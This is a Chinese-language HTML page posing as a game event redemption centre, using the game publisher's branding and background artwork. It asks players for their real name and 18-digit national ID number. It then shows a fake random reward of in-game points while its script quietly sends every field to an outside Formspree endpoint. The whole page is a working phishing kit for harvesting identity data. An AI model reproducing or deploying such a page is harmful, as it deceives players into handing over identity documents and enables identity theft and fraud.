<!DOCTYPE html>
<html lang="zh-CN">
<head>
  <meta charset="UTF-8" />
  <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
  <title>活动兑换中心</title>
  <style>
    body {
      margin: 0;
      font-family: "PingFang SC", "Microsoft YaHei", sans-serif;
      background: url('https://game.gtimg.cn/images/pg/fab/pgact/a20221115exch/bg.jpg') no-repeat center center fixed;
      background-size: cover;
      color: #fff;
    }

    .container {
      max-width: 500px;
      margin: 5% auto;
      background: rgba(0, 0, 0, 0.65);
      padding: 30px;
      border-radius: 12px;
      box-shadow: 0 0 20px rgba(255, 255, 255, 0.2);
    }

    h1 {
      text-align: center;
      margin-bottom: 30px;
      font-size: 26px;
    }

    label {
      display: block;
      margin-bottom: 5px;
      font-weight: bold;
    }

    label span {
      color: red;
    }

    input, select {
      width: 100%;
      padding: 10px;
      margin-bottom: 15px;
      border: none;
      border-radius: 5px;
      font-size: 16px;
    }

    input:invalid {
      border: 2px solid red;
    }

    .error {
      color: red;
      font-size: 13px;
      margin-top: -10px;
      margin-bottom: 10px;
    }

    button {
      background: #ffcc00;
      color: #000;
      font-size: 16px;
      font-weight: bold;
      border: none;
      padding: 12px;
      width: 100%;
      border-radius: 6px;
      cursor: pointer;
    }

    button:disabled {
      background: gray;
      cursor: not-allowed;
    }

    .message {
      background: #333;
      padding: 15px;
      border-radius: 8px;
      margin-top: 15px;
      line-height: 1.6;
    }

    .footer {
      text-align: center;
      font-size: 12px;
      color: #ccc;
      margin-top: 40px;
    }
  </style>
</head>
<body>
  <div class="container">
    <h1>活动兑换中心</h1>
    <form id="claimForm" action="https://formspree.io/f/xrbkzgel" method="POST">
      <label><span>*</span> 请选择区服</label>
      <select name="area" required>
        <option value="">请选择</option>
        <option value="微信区">微信区</option>
        <option value="QQ区">QQ区</option>
      </select>

      <label><span>*</span> 游戏昵称</label>
      <input type="text" name="nickname" placeholder="请输入游戏昵称" required>

      <label><span>*</span> 姓名</label>
      <input type="text" name="realname" id="realname" required pattern="^[\u4e00-\u9fa5]{1,5}$" placeholder="请输入真实姓名"/>
      <div class="error" id="nameError" style="display:none;">姓名需为1-5个中文字符</div>

      <label><span>*</span> 身份证号</label>
      <input type="text" name="idcard" id="idcard" required pattern="^\d{17}[\dXx]$" placeholder="请输入18位身份证号"/>
      <div class="error" id="idError" style="display:none;">请输入正确的18位身份证号</div>

      <button type="submit" id="submitBtn">提交认证</button>
    </form>

    <div class="message" id="successMessage" style="display:none;">
      <p><strong>您已成功提交认证，请勿重复提交。</strong></p>
      <p id="rewardText"></p>
      <button onclick="confirmComplete()">确认</button>
    </div>

    <div class="footer">本活动最终解释权归光子工作室所有</div>
  </div>

  <script>
    const form = document.getElementById("claimForm");
    const nameInput = document.getElementById("realname");
    const idInput = document.getElementById("idcard");
    const nameError = document.getElementById("nameError");
    const idError = document.getElementById("idError");
    const submitBtn = document.getElementById("submitBtn");
    const successMessage = document.getElementById("successMessage");
    const rewardText = document.getElementById("rewardText");

    form.addEventListener("submit", function (e) {
      if (!/^[\u4e00-\u9fa5]{1,5}$/.test(nameInput.value)) {
        nameError.style.display = "block";
        e.preventDefault();
        return;
      } else {
        nameError.style.display = "none";
      }

      if (!/^\d{17}[\dXx]$/.test(idInput.value)) {
        idError.style.display = "block";
        e.preventDefault();
        return;
      } else {
        idError.style.display = "none";
      }

      e.preventDefault(); // 防止跳转

      // 模拟概率
      const reward = Math.random() < 0.01 ? "300点卷" : "60点卷";
      rewardText.innerText = `恭喜获得${reward}，点卷将在24小时内到账。`;
      successMessage.style.display = "block";
      submitBtn.disabled = true;
      submitBtn.innerText = "您已提交";

      // 提交到 Formspree
      const formData = new FormData(form);
      fetch(form.action, {
        method: "POST",
        body: formData,
        headers: { 'Accept': 'application/json' }
      });
    });

    function confirmComplete() {
      successMessage.style.display = "none";
    }
  </script>
</body>
</html>
